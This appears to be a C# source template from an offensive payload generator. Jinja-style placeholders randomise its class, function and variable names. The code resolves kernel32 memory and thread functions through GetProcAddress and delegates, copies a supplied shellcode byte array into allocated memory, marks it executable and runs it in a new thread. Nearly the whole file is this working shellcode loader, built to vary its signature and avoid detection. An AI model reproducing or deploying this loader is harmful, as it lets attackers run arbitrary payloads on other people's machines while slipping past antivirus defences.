public class {{ special['class_name'] }}
{
    public static void {{ func_name }}(byte[] {{ v['shellcode'] }})
    {

        Protection {{ v['oldprotect'] }};

        // load the dll
        IntPtr {{ v['module'] }} = LoadLibrary("kernel32.dll");

        // get pointers to VirtualAlloc, VirtualProtect, VirtualFree, CreateThread
        IntPtr {{ v['valloc'] }} = GetProcAddress({{ v['module'] }}, "VirtualAlloc");
        IntPtr {{ v['cthread'] }} = GetProcAddress({{ v['module'] }}, "CreateThread");
        IntPtr {{ v['vfree'] }} = GetProcAddress({{ v['module'] }}, "VirtualFree");
        IntPtr {{ v['vprotect'] }} = GetProcAddress({{ v['module'] }}, "VirtualProtect");
        IntPtr {{ v['waitforso'] }} = GetProcAddress({{ v['module'] }}, "WaitForSingleObject");
        IntPtr {{ v['chandle'] }} = GetProcAddress({{ v['module'] }}, "CloseHandle");

        // convert pointers to delegates
        valloc_proto {{ v['pvalloc'] }} = (valloc_proto)Marshal.GetDelegateForFunctionPointer({{ v['valloc'] }}, typeof(valloc_proto));
        vfree_proto {{ v['pvfree'] }} = (vfree_proto)Marshal.GetDelegateForFunctionPointer({{ v['vfree'] }}, typeof(vfree_proto));
        cthread_proto {{ v['pcthread'] }} = (cthread_proto)Marshal.GetDelegateForFunctionPointer({{ v['cthread'] }}, typeof(cthread_proto));
        vprotect_proto {{ v['pvprotect'] }} = (vprotect_proto)Marshal.GetDelegateForFunctionPointer({{ v['vprotect'] }}, typeof(vprotect_proto));
        waitforso_proto {{ v['pwaitforso'] }} = (waitforso_proto)Marshal.GetDelegateForFunctionPointer({{ v['waitforso'] }}, typeof(waitforso_proto));
        chandle_proto {{ v['pchandle'] }} = (chandle_proto)Marshal.GetDelegateForFunctionPointer({{ v['chandle'] }}, typeof(chandle_proto));

        // allocate memory for the buffer
        UInt32 {{ v['func_addr'] }} = {{ v['pvalloc'] }}(0, (UInt32){{ v['shellcode'] }}.Length, MEM_COMMIT | MEM_RESERVE, Protection.PAGE_READWRITE);

        // copy the payload to the buffer
        Marshal.Copy({{ v['shellcode'] }}, 0, (IntPtr)({{ v['func_addr'] }}), {{ v['shellcode'] }}.Length);

        // make the buffer executable
        {{ v['pvprotect'] }}({{ v['func_addr'] }}, (UInt32){{ v['shellcode'] }}.Length, Protection.PAGE_EXECUTE_READ, out {{ v['oldprotect'] }});

        // get processor info
        PROCESSOR_INFO {{ v['info'] }} = new PROCESSOR_INFO();
        IntPtr {{ v['pinfo'] }} = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO)));
        Marshal.StructureToPtr({{ v['info'] }}, {{ v['pinfo'] }}, false);


        IntPtr {{ v['hThread'] }} = IntPtr.Zero;
        UInt32 {{ v['thread_id'] }} = 0;
        {{ v['hThread'] }} = {{ v['pcthread'] }}(0, 0, {{ v['func_addr'] }}, {{ v['pinfo'] }}, 0, ref {{ v['thread_id'] }});
        {{ v['pwaitforso'] }}({{ v['hThread'] }}, 0xFFFFFFFF);
        {{ v['pchandle'] }}({{ v['hThread'] }});
        {{ v['pvfree'] }}((IntPtr){{ v['func_addr'] }}, 0, MEM_RELEASE);

        return;
    }
    // delegate code from: https://www.codeproject.com/Articles/8130/Execute-Native-Code-From-NET
    delegate UInt32 valloc_proto(UInt32 lpStartAddr,
                                            UInt32 size,
                                            UInt32 flAllocationType,
                                            Protection flProtect);

    delegate IntPtr cthread_proto(UInt32 lpThreadAttributes,
                                UInt32 dwStackSize,
                                UInt32 lpStartAddress,
                                IntPtr param,
                                UInt32 dwCreationFlags,
                                ref UInt32 lpThreadId);

    delegate bool vfree_proto(IntPtr lpAddress,
                             UInt32 dwSize,
                             UInt32 dwFreeType);

    delegate bool vprotect_proto(UInt32 lpAddress, uint dwSize,
        Protection flNewProtect, out Protection lpflOldProtect);
                          
    delegate UInt32 waitforso_proto(IntPtr hHandle, UInt32 dwMilliseconds);

    delegate bool chandle_proto(IntPtr hHandle);


    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lib);

    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr FreeLibrary(string lib);

    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr {{ v['module'] }}, string proc);

    // from: https://gist.github.com/NaxAlpha/144d1dd96c7d0ad29fe149e4063a8f25
    public enum Protection
    {
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_GUARD = 0x100,
        PAGE_NOCACHE = 0x200,
        PAGE_WRITECOMBINE = 0x400
    }
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 MEM_RESERVE = 0x2000;
    private static UInt32 MEM_RELEASE = 0x8000;
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESSOR_INFO
    {
        public UInt32 dwMax;
        public UInt32 id0;
        public UInt32 id1;
        public UInt32 id2;
        public UInt32 dwStandard;
        public UInt32 dwFeature;

        // if AMD
        public UInt32 dwExt;
    }
}
